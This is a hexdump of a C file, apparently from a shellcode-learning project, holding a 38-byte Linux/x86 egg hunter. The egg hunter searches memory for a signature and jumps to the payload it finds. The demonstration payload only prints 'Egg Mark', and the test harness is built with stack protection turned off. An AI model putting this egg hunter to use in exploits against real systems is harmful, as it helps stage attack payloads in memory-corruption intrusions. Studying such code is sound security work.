00000000  2f 2a 0a 0a 20 20 20 45  67 67 20 48 75 6e 74 65  |/*..   Egg Hunte|
00000010  72 20 53 68 65 6c 6c 63  6f 64 65 20 2d 20 43 20  |r Shellcode - C |
00000020  4c 61 6e 67 75 61 67 65  20 2d 20 4c 69 6e 75 78  |Language - Linux|
00000030  2f 78 38 36 0a 20 20 20  43 6f 70 79 72 69 67 68  |/x86.   Copyrigh|
00000040  74 20 28 43 29 20 32 30  31 33 20 47 65 79 73 6c  |t (C) 2013 Geysl|
00000050  61 6e 20 47 2e 20 42 65  6d 2c 20 48 61 63 6b 69  |an G. Bem, Hacki|
00000060  6e 67 20 62 69 74 73 0a  0a 20 20 20 68 74 74 70  |ng bits..   http|
00000070  3a 2f 2f 68 61 63 6b 69  6e 67 62 69 74 73 2e 63  |://hackingbits.c|
00000080  6f 6d 0a 20 20 20 67 65  79 73 6c 61 6e 40 67 6d  |om.   geyslan@gm|
00000090  61 69 6c 2e 63 6f 6d 0a  0a 20 20 20 54 68 69 73  |ail.com..   This|
000000a0  20 70 72 6f 67 72 61 6d  20 69 73 20 66 72 65 65  | program is free|
000000b0  20 73 6f 66 74 77 61 72  65 3a 20 79 6f 75 20 63  | software: you c|
000000c0  61 6e 20 72 65 64 69 73  74 72 69 62 75 74 65 20  |an redistribute |
000000d0  69 74 20 61 6e 64 2f 6f  72 20 6d 6f 64 69 66 79  |it and/or modify|
000000e0  0a 20 20 20 69 74 20 75  6e 64 65 72 20 74 68 65  |.   it under the|
000000f0  20 74 65 72 6d 73 20 6f  66 20 74 68 65 20 47 4e  | terms of the GN|
00000100  55 20 47 65 6e 65 72 61  6c 20 50 75 62 6c 69 63  |U General Public|
00000110  20 4c 69 63 65 6e 73 65  20 61 73 20 70 75 62 6c  | License as publ|
00000120  69 73 68 65 64 20 62 79  0a 20 20 20 74 68 65 20  |ished by.   the |
00000130  46 72 65 65 20 53 6f 66  74 77 61 72 65 20 46 6f  |Free Software Fo|
00000140  75 6e 64 61 74 69 6f 6e  2c 20 65 69 74 68 65 72  |undation, either|
00000150  20 76 65 72 73 69 6f 6e  20 33 20 6f 66 20 74 68  | version 3 of th|
00000160  65 20 4c 69 63 65 6e 73  65 2c 20 6f 72 0a 20 20  |e License, or.  |
00000170  20 28 61 74 20 79 6f 75  72 20 6f 70 74 69 6f 6e  | (at your option|
00000180  29 20 61 6e 79 20 6c 61  74 65 72 20 76 65 72 73  |) any later vers|
00000190  69 6f 6e 2e 0a 0a 20 20  20 54 68 69 73 20 70 72  |ion...   This pr|
000001a0  6f 67 72 61 6d 20 69 73  20 64 69 73 74 72 69 62  |ogram is distrib|
000001b0  75 74 65 64 20 69 6e 20  74 68 65 20 68 6f 70 65  |uted in the hope|
000001c0  20 74 68 61 74 20 69 74  20 77 69 6c 6c 20 62 65  | that it will be|
000001d0  20 75 73 65 66 75 6c 2c  0a 20 20 20 62 75 74 20  | useful,.   but |
000001e0  57 49 54 48 4f 55 54 20  41 4e 59 20 57 41 52 52  |WITHOUT ANY WARR|
000001f0  41 4e 54 59 3b 20 77 69  74 68 6f 75 74 20 65 76  |ANTY; without ev|
00000200  65 6e 20 74 68 65 20 69  6d 70 6c 69 65 64 20 77  |en the implied w|
00000210  61 72 72 61 6e 74 79 20  6f 66 0a 20 20 20 4d 45  |arranty of.   ME|
00000220  52 43 48 41 4e 54 41 42  49 4c 49 54 59 20 6f 72  |RCHANTABILITY or|
00000230  20 46 49 54 4e 45 53 53  20 46 4f 52 20 41 20 50  | FITNESS FOR A P|
00000240  41 52 54 49 43 55 4c 41  52 20 50 55 52 50 4f 53  |ARTICULAR PURPOS|
00000250  45 2e 20 20 53 65 65 20  74 68 65 0a 20 20 20 47  |E.  See the.   G|
00000260  4e 55 20 47 65 6e 65 72  61 6c 20 50 75 62 6c 69  |NU General Publi|
00000270  63 20 4c 69 63 65 6e 73  65 20 66 6f 72 20 6d 6f  |c License for mo|
00000280  72 65 20 64 65 74 61 69  6c 73 2e 0a 0a 20 20 20  |re details...   |
00000290  59 6f 75 20 73 68 6f 75  6c 64 20 68 61 76 65 20  |You should have |
000002a0  72 65 63 65 69 76 65 64  20 61 20 63 6f 70 79 20  |received a copy |
000002b0  6f 66 20 74 68 65 20 47  4e 55 20 47 65 6e 65 72  |of the GNU Gener|
000002c0  61 6c 20 50 75 62 6c 69  63 20 4c 69 63 65 6e 73  |al Public Licens|
000002d0  65 0a 20 20 20 61 6c 6f  6e 67 20 77 69 74 68 20  |e.   along with |
000002e0  74 68 69 73 20 70 72 6f  67 72 61 6d 2e 20 20 49  |this program.  I|
000002f0  66 20 6e 6f 74 2c 20 73  65 65 20 3c 68 74 74 70  |f not, see <http|
00000300  3a 2f 2f 77 77 77 2e 67  6e 75 2e 6f 72 67 2f 6c  |://www.gnu.org/l|
00000310  69 63 65 6e 73 65 73 2f  3e 2e 0a 0a 2a 2f 0a 0a  |icenses/>...*/..|
00000320  2f 2a 0a 0a 20 20 20 65  67 67 5f 68 75 6e 74 65  |/*..   egg_hunte|
00000330  72 5f 73 68 65 6c 6c 63  6f 64 65 0a 0a 20 20 20  |r_shellcode..   |
00000340  2a 20 33 38 20 62 79 74  65 73 0a 20 20 20 2a 20  |* 38 bytes.   * |
00000350  6e 75 6c 6c 2d 66 72 65  65 20 69 66 20 65 67 67  |null-free if egg|
00000360  20 73 69 67 6e 61 74 75  72 65 20 69 73 0a 0a 20  | signature is.. |
00000370  20 20 23 20 67 63 63 20  2d 6d 33 32 20 2d 66 6e  |  # gcc -m32 -fn|
00000380  6f 2d 73 74 61 63 6b 2d  70 72 6f 74 65 63 74 6f  |o-stack-protecto|
00000390  72 20 2d 7a 20 65 78 65  63 73 74 61 63 6b 20 65  |r -z execstack e|
000003a0  67 67 5f 68 75 6e 74 65  72 5f 73 68 65 6c 6c 63  |gg_hunter_shellc|
000003b0  6f 64 65 2e 63 20 2d 6f  20 65 67 67 5f 68 75 6e  |ode.c -o egg_hun|
000003c0  74 65 72 5f 73 68 65 6c  6c 63 6f 64 65 0a 0a 20  |ter_shellcode.. |
000003d0  20 20 54 65 73 74 69 6e  67 0a 20 20 20 23 20 2e  |  Testing.   # .|
000003e0  2f 65 67 67 5f 68 75 6e  74 65 72 5f 73 68 65 6c  |/egg_hunter_shel|
000003f0  6c 63 6f 64 65 0a 0a 2a  2f 0a 0a 23 69 6e 63 6c  |lcode..*/..#incl|
00000400  75 64 65 20 3c 73 74 64  69 6f 2e 68 3e 0a 23 69  |ude <stdio.h>.#i|
00000410  6e 63 6c 75 64 65 20 3c  73 74 72 69 6e 67 2e 68  |nclude <string.h|
00000420  3e 0a 0a 75 6e 73 69 67  6e 65 64 20 63 68 61 72  |>..unsigned char|
00000430  20 65 67 67 5b 5d 20 3d  20 5c 0a 0a 20 20 20 20  | egg[] = \..    |
00000440  20 20 20 20 20 20 20 20  20 20 2f 2f 20 57 72 69  |          // Wri|
00000450  74 65 20 22 45 67 67 20  4d 61 72 6b 22 20 61 6e  |te "Egg Mark" an|
00000460  64 20 65 78 69 74 0a 0a  20 20 20 20 20 20 20 20  |d exit..        |
00000470  20 20 20 20 20 20 22 5c  78 39 30 5c 78 35 30 5c  |      "\x90\x50\|
00000480  78 39 30 5c 78 35 30 22  20 20 20 2f 2f 20 3c 2d  |x90\x50"   // <-|
00000490  20 46 69 72 73 74 20 46  6f 75 72 20 42 79 74 65  | First Four Byte|
000004a0  73 20 6f 66 20 53 69 67  6e 61 74 75 72 65 0a 20  |s of Signature. |
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |             "\x|
000004c0  39 30 5c 78 35 30 5c 78  39 30 5c 78 35 30 22 20  |90\x50\x90\x50" |
000004d0  20 20 2f 2f 20 3c 2d 20  53 61 6d 65 20 66 69 72  |  // <- Same fir|
000004e0  73 74 20 62 79 74 65 73  20 61 72 65 20 6d 61 6e  |st bytes are man|
000004f0  64 61 74 6f 72 79 0a 20  20 20 20 20 20 20 20 20  |datory.         |
00000500  20 20 20 20 20 22 5c 78  33 31 5c 78 64 62 22 0a  |     "\x31\xdb".|
00000510  20 20 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |              "\|
00000520  78 66 37 5c 78 65 33 5c  78 62 30 5c 78 30 34 5c  |xf7\xe3\xb0\x04\|
00000530  78 36 61 5c 78 30 61 5c  78 36 38 5c 78 34 64 5c  |x6a\x0a\x68\x4d\|
00000540  78 36 31 5c 78 37 32 22  0a 20 20 20 20 20 20 20  |x61\x72".       |
00000550  20 20 20 20 20 20 20 22  5c 78 36 62 5c 78 36 38  |       "\x6b\x68|
00000560  5c 78 34 35 5c 78 36 37  5c 78 36 37 5c 78 32 30  |\x45\x67\x67\x20|
00000570  5c 78 62 33 5c 78 30 31  5c 78 38 39 5c 78 65 31  |\xb3\x01\x89\xe1|
00000580  22 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |".              |
00000590  22 5c 78 62 32 5c 78 30  39 5c 78 63 64 5c 78 38  |"\xb2\x09\xcd\x8|
000005a0  30 5c 78 62 30 5c 78 30  31 5c 78 63 64 5c 78 38  |0\xb0\x01\xcd\x8|
000005b0  30 22 3b 0a 0a 20 20 20  20 20 20 20 20 20 20 20  |0";..           |
000005c0  20 20 20 75 6e 73 69 67  6e 65 64 20 63 68 61 72  |   unsigned char|
000005d0  20 65 67 67 68 75 6e 74  65 72 5b 5d 20 3d 20 5c  | egghunter[] = \|
000005e0  0a 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000005f0  2f 2f 20 53 65 61 72 63  68 20 66 6f 72 20 74 68  |// Search for th|
00000600  65 20 45 67 67 20 53 69  67 6e 61 74 75 72 65 20  |e Egg Signature |
00000610  28 30 78 35 30 39 30 35  30 39 30 20 78 20 32 29  |(0x50905090 x 2)|
00000620  20 2d 20 74 68 65 20 45  67 67 27 73 20 38 20 66  | - the Egg's 8 f|
00000630  69 72 73 74 20 69 6e 73  74 72 75 63 74 69 6f 6e  |irst instruction|
00000640  73 20 28 6e 6f 70 2c 20  70 75 73 68 20 65 61 78  |s (nop, push eax|
00000650  2c 20 6e 6f 70 2c 20 70  75 73 68 20 65 61 78 2e  |, nop, push eax.|
00000660  2e 2e 29 0a 0a 20 20 20  20 20 20 20 20 20 20 20  |..)..           |
00000670  20 20 20 22 5c 78 66 63  5c 78 33 31 5c 78 63 39  |   "\xfc\x31\xc9|
00000680  5c 78 66 37 5c 78 65 31  5c 78 36 36 5c 78 38 31  |\xf7\xe1\x66\x81|
00000690  5c 78 63 61 5c 78 66 66  5c 78 30 66 22 0a 20 20  |\xca\xff\x0f".  |
000006a0  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 34  |            "\x4|
000006b0  32 5c 78 36 61 5c 78 32  31 5c 78 35 38 5c 78 38  |2\x6a\x21\x58\x8|
000006c0  64 5c 78 35 61 5c 78 30  34 5c 78 63 64 5c 78 38  |d\x5a\x04\xcd\x8|
000006d0  30 5c 78 33 63 22 0a 20  20 20 20 20 20 20 20 20  |0\x3c".         |
000006e0  20 20 20 20 20 22 5c 78  66 32 5c 78 37 34 5c 78  |     "\xf2\x74\x|
000006f0  65 65 5c 78 62 38 22 0a  20 20 20 20 20 20 20 20  |ee\xb8".        |
00000700  20 20 20 20 20 20 22 5c  78 39 30 5c 78 35 30 5c  |      "\x90\x50\|
00000710  78 39 30 5c 78 35 30 22  20 20 20 2f 2f 20 3c 2d  |x90\x50"   // <-|
00000720  20 53 69 67 6e 61 74 75  72 65 0a 20 20 20 20 20  | Signature.     |
00000730  20 20 20 20 20 20 20 20  20 22 5c 78 38 39 5c 78  |         "\x89\x|
00000740  64 37 5c 78 61 66 5c 78  37 35 5c 78 65 39 5c 78  |d7\xaf\x75\xe9\x|
00000750  61 66 5c 78 37 35 5c 78  65 36 5c 78 66 66 5c 78  |af\x75\xe6\xff\x|
00000760  65 37 22 3b 0a 0a 0a 6d  61 69 6e 20 28 29 0a 7b  |e7";...main ().{|
00000770  0a 0a 20 20 20 20 2f 2f  20 57 68 65 6e 20 63 6f  |..    // When co|
00000780  6e 74 61 69 6e 73 20 6e  75 6c 6c 20 62 79 74 65  |ntains null byte|
00000790  73 2c 20 70 72 69 6e 74  66 20 77 69 6c 6c 20 73  |s, printf will s|
000007a0  68 6f 77 20 61 20 77 72  6f 6e 67 20 73 68 65 6c  |how a wrong shel|
000007b0  6c 63 6f 64 65 20 6c 65  6e 67 74 68 2e 0a 0a 20  |lcode length... |
000007c0  20 20 20 70 72 69 6e 74  66 28 22 53 68 65 6c 6c  |   printf("Shell|
000007d0  63 6f 64 65 20 4c 65 6e  67 74 68 3a 20 20 25 64  |code Length:  %d|
000007e0  5c 6e 22 2c 20 73 74 72  6c 65 6e 28 65 67 67 68  |\n", strlen(eggh|
000007f0  75 6e 74 65 72 29 29 3b  0a 0a 20 20 20 20 2f 2f  |unter));..    //|
00000800  20 50 6f 6c 6c 75 74 65  73 20 61 6c 6c 20 72 65  | Pollutes all re|
00000810  67 69 73 74 65 72 73 20  65 6e 73 75 72 69 6e 67  |gisters ensuring|
00000820  20 74 68 61 74 20 74 68  65 20 73 68 65 6c 6c 63  | that the shellc|
00000830  6f 64 65 20 72 75 6e 73  20 69 6e 20 61 6e 79 20  |ode runs in any |
00000840  63 69 72 63 75 6d 73 74  61 6e 63 65 2e 0a 0a 20  |circumstance... |
00000850  20 20 20 5f 5f 61 73 6d  5f 5f 20 28 22 6d 6f 76  |   __asm__ ("mov|
00000860  6c 20 24 30 78 66 66 66  66 66 66 66 66 2c 20 25  |l $0xffffffff, %|
00000870  65 61 78 5c 6e 5c 74 22  0a 20 20 20 20 20 20 20  |eax\n\t".       |
00000880  20 20 20 20 20 22 6d 6f  76 6c 20 25 65 61 78 2c  |     "movl %eax,|
00000890  20 25 65 62 78 5c 6e 5c  74 22 0a 20 20 20 20 20  | %ebx\n\t".     |
000008a0  20 20 20 20 20 20 20 22  6d 6f 76 6c 20 25 65 61  |       "movl %ea|
000008b0  78 2c 20 25 65 63 78 5c  6e 5c 74 22 0a 20 20 20  |x, %ecx\n\t".   |
000008c0  20 20 20 20 20 20 20 20  20 22 6d 6f 76 6c 20 25  |         "movl %|
000008d0  65 61 78 2c 20 25 65 64  78 5c 6e 5c 74 22 0a 20  |eax, %edx\n\t". |
000008e0  20 20 20 20 20 20 20 20  20 20 20 22 6d 6f 76 6c  |           "movl|
000008f0  20 25 65 61 78 2c 20 25  65 73 69 5c 6e 5c 74 22  | %eax, %esi\n\t"|
00000900  0a 20 20 20 20 20 20 20  20 20 20 20 20 22 6d 6f  |.            "mo|
00000910  76 6c 20 25 65 61 78 2c  20 25 65 64 69 5c 6e 5c  |vl %eax, %edi\n\|
00000920  74 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |t".            "|
00000930  6d 6f 76 6c 20 25 65 61  78 2c 20 25 65 62 70 5c  |movl %eax, %ebp\|
00000940  6e 5c 74 22 0a 0a 20 20  20 20 20 20 20 20 20 20  |n\t"..          |
00000950  20 20 2f 2f 20 53 65 74  74 69 6e 67 20 74 68 65  |  // Setting the|
00000960  20 65 67 67 20 68 75 6e  74 65 72 20 73 69 67 6e  | egg hunter sign|
00000970  61 74 75 72 65 20 74 6f  20 73 65 61 72 63 68 20  |ature to search |
00000980  28 62 79 74 65 20 72 65  76 65 72 73 65 20 6f 72  |(byte reverse or|
00000990  64 65 72 29 0a 0a 20 20  20 20 20 20 20 20 20 20  |der)..          |
000009a0  20 20 22 6d 6f 76 6c 20  24 30 78 35 30 39 30 35  |  "movl $0x50905|
000009b0  30 39 30 2c 20 28 65 67  67 68 75 6e 74 65 72 2b  |090, (egghunter+|
000009c0  32 34 29 5c 6e 5c 74 22  0a 0a 20 20 20 20 20 20  |24)\n\t"..      |
000009d0  20 20 20 20 20 20 2f 2f  20 43 61 6c 6c 69 6e 67  |      // Calling|
000009e0  20 74 68 65 20 73 68 65  6c 6c 63 6f 64 65 0a 20  | the shellcode. |
000009f0  20 20 20 20 20 20 20 20  20 20 20 22 63 61 6c 6c  |           "call|
00000a00  20 65 67 67 68 75 6e 74  65 72 22 29 3b 0a 0a 7d  | egghunter");..}|
00000a10
